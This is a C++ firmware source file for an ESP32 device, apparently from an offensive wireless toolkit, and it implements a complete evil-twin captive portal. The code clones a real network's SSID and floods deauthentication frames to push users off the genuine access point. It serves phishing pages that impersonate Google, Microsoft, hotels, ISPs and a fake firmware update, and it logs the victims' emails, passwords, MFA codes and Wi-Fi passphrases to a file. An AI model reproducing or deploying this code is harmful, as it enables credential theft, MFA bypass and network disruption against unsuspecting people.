// ═══════════════════════════════════════════════════════════════════════════
// HaleHound Captive Portal — implementation
// Created: 2026-09-18 (T-Embed CC1101 port, roadmap §7 fidelity pass)
// ═══════════════════════════════════════════════════════════════════════════

#include "captive_portal.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "portal_pages.h"
#include "cyd_config.h"
#include "messaging.h"
#include "radio_manager.h"
#include "storage_manager.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#define CP_LOG_MAX      16
#define CP_LOG_LINE_LEN 40

// Template ordinals — match portal_pages.h's portalTemplateNames[] order
// exactly (also wifi_attacks.h's PortalTemplate enum, not included here to
// avoid pulling in that whole header just for 11 constants).
#define CP_TMPL_WIFI            0
#define CP_TMPL_GOOGLE          1
#define CP_TMPL_MICROSOFT       2
#define CP_TMPL_STARBUCKS       3
#define CP_TMPL_HOTEL           4
#define CP_TMPL_AIRPORT         5
#define CP_TMPL_ATT             6
#define CP_TMPL_MCDONALDS       7
#define CP_TMPL_XFINITY         8
#define CP_TMPL_FIRMWARE_UPDATE 9
#define CP_TMPL_WIFI_RECONNECT  10

static char s_ssid[32] = "FreeWiFi";
static int s_template = CP_TMPL_WIFI;

static WebServer s_server(80);
static DNSServer s_dnsServer;

static TaskHandle_t s_workerHandle = NULL;
static QueueHandle_t s_cmdQueue = NULL;
static SemaphoreHandle_t s_doneSem = NULL;

static uint8_t s_targetBssid[6];
static uint8_t s_targetChannel = 1;
static bool s_hasTarget = false;

static char s_capturedEmail[32] = {0};

static char s_logBuf[CP_LOG_MAX][CP_LOG_LINE_LEN];
static const char *s_logPtrs[CP_LOG_MAX];
static int s_logCount = 0;

// ═══════════════════════════════════════════════════════════════════════════
// SSID EDIT — encoder-native equivalent of the original's on-screen
// keyboard (see captive_portal.h for why this shape).
// ═══════════════════════════════════════════════════════════════════════════

static const char EDIT_CHARSET[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_ ";
static const int EDIT_CHARSET_LEN = sizeof(EDIT_CHARSET) - 1;
static const int EDIT_WHEEL_SIZE = EDIT_CHARSET_LEN + 1; // + backspace sentinel

static char s_editBuffer[32];
static int s_editLen = 0;
static int s_editWheelPos = 0;
static char s_editDisplay[48];

void captivePortalEditSSIDBegin() {
    strncpy(s_editBuffer, s_ssid, sizeof(s_editBuffer) - 1);
    s_editBuffer[sizeof(s_editBuffer) - 1] = '\0';
    s_editLen = strlen(s_editBuffer);
    s_editWheelPos = 0;
}

void captivePortalEditRotate(int delta) {
    s_editWheelPos = (s_editWheelPos + delta + EDIT_WHEEL_SIZE) % EDIT_WHEEL_SIZE;
}

void captivePortalEditCommitChar() {
    if (s_editWheelPos == EDIT_CHARSET_LEN) {
        if (s_editLen > 0) s_editLen--;
    } else if (s_editLen < (int)sizeof(s_editBuffer) - 1) {
        s_editBuffer[s_editLen++] = EDIT_CHARSET[s_editWheelPos];
    }
    s_editBuffer[s_editLen] = '\0';
    s_editWheelPos = 0;
}

void captivePortalEditFinish() {
    if (s_editLen > 0) {
        strncpy(s_ssid, s_editBuffer, sizeof(s_ssid) - 1);
        s_ssid[sizeof(s_ssid) - 1] = '\0';
    }
}

void captivePortalEditCancel() {
    // s_ssid untouched — buffer simply discarded.
}

const char *captivePortalGetEditDisplay() {
    char pendingBuf[2];
    const char *pendingLabel;
    if (s_editWheelPos == EDIT_CHARSET_LEN) {
        pendingLabel = "DEL";
    } else {
        pendingBuf[0] = EDIT_CHARSET[s_editWheelPos];
        pendingBuf[1] = '\0';
        pendingLabel = pendingBuf;
    }
    snprintf(s_editDisplay, sizeof(s_editDisplay), "%s|%s", s_editBuffer, pendingLabel);
    return s_editDisplay;
}

void captivePortalReadyEnter() {
    // Pure state — s_ssid/s_template already hold their values from a
    // prior session or their defaults, nothing to initialize.
}

void captivePortalAdjustTemplate(int delta) {
    int count = sizeof(portalTemplateNames) / sizeof(portalTemplateNames[0]);
    s_template = (s_template + delta + count) % count;
}

const char *captivePortalGetSSID() { return s_ssid; }
const char *captivePortalGetTemplateName() { return portalTemplateNames[s_template]; }

// Karma Attack handoff: pre-seed the SSID that captivePortalReadyEnter()
// will carry into captivePortalStart().  Falsy inputs (NULL/empty) leave
// the buffer untouched so the previous value stands.
void captivePortalSetSSID(const char *ssid) {
    if (!ssid || ssid[0] == '\0') return;
    strncpy(s_ssid, ssid, sizeof(s_ssid) - 1);
    s_ssid[sizeof(s_ssid) - 1] = '\0';
}

// ═══════════════════════════════════════════════════════════════════════════
// LIVE LOG — same scrolling-log shape as probe_sniffer.cpp's addLogEntry().
// ═══════════════════════════════════════════════════════════════════════════

static void addLogEntry(const char *text) {
    if (s_logCount >= CP_LOG_MAX) {
        for (int i = 0; i < CP_LOG_MAX - 1; i++) {
            memcpy(s_logBuf[i], s_logBuf[i + 1], CP_LOG_LINE_LEN);
        }
        s_logCount = CP_LOG_MAX - 1;
    }
    strncpy(s_logBuf[s_logCount], text, CP_LOG_LINE_LEN - 1);
    s_logBuf[s_logCount][CP_LOG_LINE_LEN - 1] = '\0';
    s_logCount++;
    for (int i = 0; i < s_logCount; i++) s_logPtrs[i] = s_logBuf[i];
}

static void postLogUpdate() {
    RenderMsg msg;
    msg.kind = RENDER_MSG_SCAN_COMPLETE; // repurposed as "log updated", matches probe_sniffer.cpp
    messagingPostTelemetry(msg);
}

const char *const *captivePortalGetLogLines() { return s_logPtrs; }
int captivePortalGetLogCount() { return (s_logCount > 0) ? s_logCount : 1; }

// ═══════════════════════════════════════════════════════════════════════════
// CREDENTIAL STORAGE — appended to /creds.txt via storage_manager.cpp
// instead of the original's EEPROM + separate SD remount (see
// captive_portal.h for why the EEPROM-backed in-app viewer is dropped).
// ═══════════════════════════════════════════════════════════════════════════

static void saveCredential(const char *email, const char *password, const char *extra) {
    char line[128];
    snprintf(line, sizeof(line), "%s | %s | %s | %s\n",
             s_ssid, email ? email : "", password ? password : "", extra ? extra : "");
    storageAppendTextFile("/creds.txt", line);
}

// ═══════════════════════════════════════════════════════════════════════════
// PORTAL TEMPLATE DISPATCH — ported verbatim from getPortalPage().
// ═══════════════════════════════════════════════════════════════════════════

static const char *getPortalPage(int tmpl, const char *stage) {
    if (stage && stage[0]) {
        if (strcmp(stage, "password") == 0) {
            if (tmpl == CP_TMPL_GOOGLE) return portal_google_password;
            if (tmpl == CP_TMPL_MICROSOFT) return portal_microsoft_password;
        } else if (strcmp(stage, "mfa") == 0) {
            if (tmpl == CP_TMPL_GOOGLE) return portal_google_mfa;
            if (tmpl == CP_TMPL_MICROSOFT) return portal_microsoft_mfa;
        }
    }
    switch (tmpl) {
        case CP_TMPL_WIFI:            return portal_wifi;
        case CP_TMPL_GOOGLE:          return portal_google_email;
        case CP_TMPL_MICROSOFT:       return portal_microsoft_email;
        case CP_TMPL_STARBUCKS:       return portal_starbucks;
        case CP_TMPL_HOTEL:           return portal_hotel;
        case CP_TMPL_AIRPORT:         return portal_airport;
        case CP_TMPL_ATT:             return portal_att;
        case CP_TMPL_MCDONALDS:       return portal_mcdonalds;
        case CP_TMPL_XFINITY:         return portal_xfinity;
        case CP_TMPL_FIRMWARE_UPDATE: return portal_firmware_update;
        case CP_TMPL_WIFI_RECONNECT:  return portal_wifi_reconnect;
        default:                      return portal_wifi;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// WEB HANDLERS — ported verbatim from handleRoot()/handleCapture()/etc.
// ═══════════════════════════════════════════════════════════════════════════

static void handleRoot() {
    addLogEntry("[+] Client connected");
    postLogUpdate();

    const char *page = getPortalPage(s_template, NULL);
    String html = FPSTR(page);
    if (s_template == CP_TMPL_FIRMWARE_UPDATE || s_template == CP_TMPL_WIFI_RECONNECT) {
        html.replace("{{SSID}}", String(s_ssid));
    }
    s_server.send(200, "text/html", html);
}

static void handleCaptive() {
    s_server.sendHeader("Location", "/", true);
    s_server.send(302, "text/plain", "");
}

static void handleSuccess() {
    s_server.send(200, "text/html", FPSTR(portal_success));
}

static void handleCapture() {
    // PSK capture — firmware update / wifi reconnect templates.
    String psk = s_server.arg("psk");
    if (psk.length() > 0) {
        char logLine[CP_LOG_LINE_LEN];
        snprintf(logLine, sizeof(logLine), "[!!!] PSK: %.24s", psk.c_str());
        addLogEntry(logLine);
        saveCredential(s_ssid, psk.c_str(), "PSK");
        postLogUpdate();
        s_server.send(200, "text/html", FPSTR(portal_success));
        return;
    }

    String stage = s_server.arg("stage");
    String email = s_server.arg("email");
    String password = s_server.arg("password");
    String mfaCode = s_server.arg("mfa_code");
    String room = s_server.arg("room");

    if (stage == "email") {
        strncpy(s_capturedEmail, email.c_str(), sizeof(s_capturedEmail) - 1);
        s_capturedEmail[sizeof(s_capturedEmail) - 1] = '\0';

        char logLine[CP_LOG_LINE_LEN];
        snprintf(logLine, sizeof(logLine), "[!] EMAIL: %.28s", email.c_str());
        addLogEntry(logLine);
        postLogUpdate();

        const char *page = getPortalPage(s_template, "password");
        String html = FPSTR(page);
        html.replace("{{EMAIL}}", email);
        s_server.send(200, "text/html", html);
        return;

    } else if (stage == "password") {
        char logLine[CP_LOG_LINE_LEN];
        snprintf(logLine, sizeof(logLine), "[!] PASS: %.24s", password.c_str());
        addLogEntry(logLine);
        saveCredential(email.c_str(), password.c_str(), NULL);
        postLogUpdate();

        const char *page = getPortalPage(s_template, "mfa");
        String html = FPSTR(page);
        html.replace("{{EMAIL}}", email);
        s_server.send(200, "text/html", html);
        return;

    } else if (stage == "mfa") {
        char logLine[CP_LOG_LINE_LEN];
        snprintf(logLine, sizeof(logLine), "[!] MFA: %.16s", mfaCode.c_str());
        addLogEntry(logLine);

        char line[128];
        snprintf(line, sizeof(line), "%s | %s | MFA | %s\n", s_ssid, s_capturedEmail, mfaCode.c_str());
        storageAppendTextFile("/creds.txt", line);
        postLogUpdate();

        s_server.send(200, "text/html", FPSTR(portal_success));
        return;

    } else {
        // Single-stage: all fields captured at once.
        if (email.length() > 0) {
            char logLine[CP_LOG_LINE_LEN];
            snprintf(logLine, sizeof(logLine), "[!] EMAIL: %.28s", email.c_str());
            addLogEntry(logLine);
        }
        if (password.length() > 0) {
            char logLine[CP_LOG_LINE_LEN];
            snprintf(logLine, sizeof(logLine), "[!] PASS: %.24s", password.c_str());
            addLogEntry(logLine);
        }
        const char *extra = (room.length() > 0) ? room.c_str() : NULL;
        if (extra) {
            char logLine[CP_LOG_LINE_LEN];
            snprintf(logLine, sizeof(logLine), "[!] ROOM: %.28s", extra);
            addLogEntry(logLine);
        }
        saveCredential(email.c_str(), password.c_str(), extra);
        postLogUpdate();

        s_server.send(200, "text/html", FPSTR(portal_success));
        return;
    }
}

static void setupWebHandlers() {
    s_server.on("/", HTTP_GET, handleRoot);
    s_server.on("/", HTTP_POST, handleRoot);
    s_server.on("/capture", HTTP_POST, handleCapture);
    s_server.on("/success", HTTP_GET, handleSuccess);
    // Captive portal detection endpoints.
    s_server.on("/generate_204", HTTP_GET, handleCaptive);        // Android
    s_server.on("/hotspot-detect.html", HTTP_GET, handleCaptive); // Apple/iOS
    s_server.on("/ncsi.txt", HTTP_GET, handleCaptive);            // Windows
    s_server.on("/connecttest.txt", HTTP_GET, handleCaptive);     // Windows 10+
    s_server.onNotFound(handleCaptive);                           // catch-all
}

// ═══════════════════════════════════════════════════════════════════════════
// BACKGROUND DEAUTH — ported from cpDeauthTask(). Unlike Deauther/AuthFlood,
// no APSTA teardown/rebuild: the evil twin's own AP interface (already up
// and serving real clients) is reused directly for TX.
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t s_deauthHandle = NULL;
static volatile bool s_deauthRunning = false;
static volatile bool s_deauthDone = false;

static void portalDeauthTask(void *param) {
    (void)param;

    uint8_t deauthFrame[26] = {
        0xC0, 0x00,                         // Deauth
        0x00, 0x00,                         // duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // source (AP BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // sequence
        0x07, 0x00                          // reason: class 3 frame
    };
    memcpy(deauthFrame + 10, s_targetBssid, 6);
    memcpy(deauthFrame + 16, s_targetBssid, 6);

    esp_wifi_set_channel(s_targetChannel, WIFI_SECOND_CHAN_NONE);

    uint32_t failStreak = 0;
    while (s_deauthRunning) {
        if (ESP.getFreeHeap() < 20000) break; // heap safety, matches the original

        if (failStreak > 10) {
            // Re-set channel only — esp_wifi_stop/start here would kill
            // the evil twin AP (same subsystem), matches the original's
            // explicit warning against that.
            esp_wifi_set_channel(s_targetChannel, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(pdMS_TO_TICKS(100));
            failStreak = 0;
        }

        for (int i = 0; i < 10 && s_deauthRunning; i++) {
            esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
            if (res == ESP_OK) failStreak = 0; else failStreak++;
        }

        vTaskDelay(1); // yield to feed the watchdog + let the portal serve clients
    }

    s_deauthDone = true;
    vTaskDelete(NULL);
}

static void startDeauthTask() {
    s_deauthDone = false;
    s_deauthRunning = true;
    xTaskCreatePinnedToCore(portalDeauthTask, "portal_deauth", 4096, NULL, 1, &s_deauthHandle, 0);
}

static void stopDeauthTask() {
    s_deauthRunning = false;
    if (s_deauthHandle) {
        uint32_t waitStart = millis();
        while (!s_deauthDone && (millis() - waitStart < 500)) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        s_deauthHandle = NULL;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PORTAL WORKER — ported from startPortal()/loop()/stopPortal().
// ═══════════════════════════════════════════════════════════════════════════

static void portalWorkerTask(void *param) {
    (void)param;

    // Quick scan for the real AP sharing our chosen SSID, to target the
    // background deauth at — matches the original's own "find real AP,
    // then evil-twin its channel" startPortal() logic.
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    int n = WiFi.scanNetworks(false, true);
    s_hasTarget = false;
    for (int i = 0; i < n; i++) {
        if (strcasecmp(WiFi.SSID(i).c_str(), s_ssid) == 0) {
            memcpy(s_targetBssid, WiFi.BSSID(i), 6);
            s_targetChannel = WiFi.channel(i);
            s_hasTarget = true;
            break;
        }
    }
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    delay(50);

    uint8_t ch = s_hasTarget ? s_targetChannel : 1;
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(s_ssid, NULL, ch); // open AP, no password — matches the original

    esp_wifi_set_max_tx_power(82);
    esp_wifi_set_ps(WIFI_PS_NONE);

    s_dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    s_dnsServer.start(53, "*", WiFi.softAPIP());

    setupWebHandlers();
    s_server.begin();

    s_logCount = 0;
    addLogEntry("EVIL TWIN ACTIVE");
    char startLine[CP_LOG_LINE_LEN];
    snprintf(startLine, sizeof(startLine), "SSID:%s CH:%d", s_ssid, ch);
    addLogEntry(startLine);
    if (s_hasTarget) {
        addLogEntry("Deauthing real AP clients...");
        startDeauthTask();
    } else {
        addLogEntry("Real AP not found - no deauth");
    }

    RenderMsg msg;
    msg.kind = RENDER_MSG_SCAN_COMPLETE; // repurposed as "portal is now active"
    messagingPostTelemetry(msg);

    for (;;) {
        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, 0) == pdTRUE && cmd.type == CMD_STOP) {
            break;
        }

        s_dnsServer.processNextRequest();
        s_server.handleClient();

        vTaskDelay(pdMS_TO_TICKS(2));
    }

    if (s_hasTarget) stopDeauthTask();
    s_server.close();
    s_dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(50);

    radioRelease(RADIO_WIFI);
    xSemaphoreGive(s_doneSem);
    vTaskDelete(NULL);
}

void captivePortalStart() {
    if (!radioAcquire(RADIO_WIFI)) {
        #if CYD_DEBUG
        Serial.println("[CAPTIVE_PORTAL] ERROR: could not acquire radio");
        #endif
        return;
    }

    s_cmdQueue = messagingCreateCmdQueue();
    s_doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(portalWorkerTask, "captive_portal", 8192, NULL, 2, &s_workerHandle, 0);
}

void captivePortalStop() {
    if (!s_cmdQueue) return;

    Cmd cmd;
    cmd.type = CMD_STOP;
    xQueueSend(s_cmdQueue, &cmd, portMAX_DELAY);
    xSemaphoreTake(s_doneSem, portMAX_DELAY);

    vQueueDelete(s_cmdQueue);
    vSemaphoreDelete(s_doneSem);
    s_cmdQueue = NULL;
    s_doneSem = NULL;
    s_workerHandle = NULL;
}
